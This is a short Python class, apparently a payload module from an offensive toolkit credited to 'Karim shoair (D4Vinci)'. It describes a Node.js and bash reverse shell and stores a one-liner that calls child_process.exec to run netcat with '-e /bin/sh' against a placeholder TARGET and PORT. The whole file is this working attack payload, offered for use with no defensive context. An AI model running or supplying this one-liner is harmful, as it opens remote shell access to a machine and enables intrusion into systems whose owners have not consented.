class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Establish a reverse connection with nodejs and bash."
    function    = "reverse shell"
    liner       = "require('child_process').exec('nc -e /bin/sh TARGET PORT')"
